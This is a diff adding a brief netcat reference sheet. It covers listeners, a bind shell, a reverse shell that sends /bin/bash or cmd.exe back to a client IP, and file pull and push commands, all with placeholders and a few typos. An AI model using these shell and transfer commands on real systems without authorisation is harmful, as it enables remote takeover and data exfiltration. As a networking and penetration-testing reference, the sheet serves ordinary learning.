@@ -1,0 +1,51 @@
+Netcat is a simple TCP/UDP listener that can open ports and allow communication and file transfer
+
+Check for port opening(s) with:
+
+netstat -tulpn
+------------------------------------------
+
+Start a listener
+
+Target
+netcat -l [port]
+
+Client
+netcat [target IP] [listening port]
+------------------------------------------
+
+Shell prompt
+
+Target
+netcat -l -p [port] -e /bin/bash OR cmd.exe
+
+Client
+netcat [target IP] [listening port]
+------------------------------------------
+
+Reverse shell
+
+Client
+netcat -l -p [port]
+
+Target
+netcat [clinetIP] [listening port] -e /bin/bash OR cmd.exe
+------------------------------------------
+
+Transfer files 
+
+Pull files
+
+Target
+netcat -l -p [listening port] < [file path/name to prep for transfer]
+
+Client
+netcat -w3 [target IP] [port] > [file path/name to save on client machine]
+
+Push files
+
+Client
+netcat-l -p [listening port] > [file path/name to save on client machine]
+
+Target
+netcat -w3 [client IP] [listening port] < [file path/name to transfer]
